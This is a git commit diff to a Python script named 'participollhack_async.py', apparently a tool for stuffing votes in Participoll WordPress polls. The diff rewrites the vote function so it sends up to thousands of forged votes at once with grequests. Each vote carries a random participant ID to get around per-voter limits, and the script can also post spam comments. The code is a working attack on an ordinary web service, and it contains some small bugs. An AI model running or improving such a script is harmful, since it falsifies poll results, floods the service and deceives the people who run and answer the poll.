c00ae8ddf222d1ae610431aa684e4267ca950e2a
shiaky <some-body@somewhere.com>
2016-05-02 18:23:16 +0200

    new async implementation

--- participollhack_async.py
+++ participollhack_async.py
@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import requests
+import grequests
 import argparse
 from random import randint
 
@@ -11,23 +12,41 @@ class ParticipollHack:
         self.postVote = "/wp-content/themes/participoll/alternativeCall.php?action=run_ajax&fn=log_response&userID={0}&participantID={1}&response={2}"
         self.postComment = "/wp-content/themes/participoll/alternativeCall.php?action=run_ajax&fn=log_comment&userID={0}&comment={1}"
 
-    def send_vote(self, vote ="A", count = 1000, verbos=False):
+    def send_vote(self, vote ="A", count = 1000, verbose=False):
         if vote not in ["A", "B", "C", "D", "E", "F"]:
             print("Error: vote has to be an uppercase letter between A and F")
             return 42
 
+        urls = []
+
         for i in range(count):
             participantID = randint(10000, 99999)
-
             postURL = self.baseURL + self.postVote.format(self.userID, participantID, vote)
-            r = requests.post(postURL)
-            if r.status_code != 200 or bytes(b"OK") not in r.content:
-                print("Error while sending vote :/")
+            urls.append(postURL)
+        if verbose:
+            i = 1
+            for u in urls:
+                print("Request {} will be sent as: {}".format(i, u))
+                i += 1
+
+        rs = (grequests.post(u) for u in urls)
+        if verbose:
+            print("Will send the {} requests now !!!! NaNaNaNaNaNaNa Batman...".format(count))
+        response = grequests.map(rs)
+
+        if verbose:
+            i = 1
+            for re in response:
+                if type(re) is "requests.models.Response":
+                    print("Response {} was: {}".format(i, re.text))
+                else:
+                    print("Response {} was not received yet :/".format(i))
+                i += 1
+
+        for re in response:
+            if "OK" not in re.text:
+                print("An Error occurred during the process :/")
                 return 1337
-            if verbos:
-                print("...sent vote {}".format(i+1))
-        print("successfully sent vote [{}] {} times".format(vote, count))
-        return 0
 
     def send_comment(self, comment="foo ba", count=1):
         for i in range(count):
@@ -56,10 +75,10 @@ if __name__ == '__main__':
 
     if not args.n:
         print("Vote [{}] will be sent 100 times to participoll".format(args.vote))
-        error =part.send_vote(vote=args.vote, verbos=bool(args.v))
+        error =part.send_vote(vote=args.vote, verbose=bool(args.v))
     else:
         print("Vote [{}] will be sent {} times to participoll".format(args.vote, args.n))
-        error =part.send_vote(vote=args.vote, count=args.n, verbos=bool(args.v))
+        error =part.send_vote(vote=args.vote, count=args.n, verbose=bool(args.v))
 
     if args.p and not error:
         part.send_comment(comment="~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
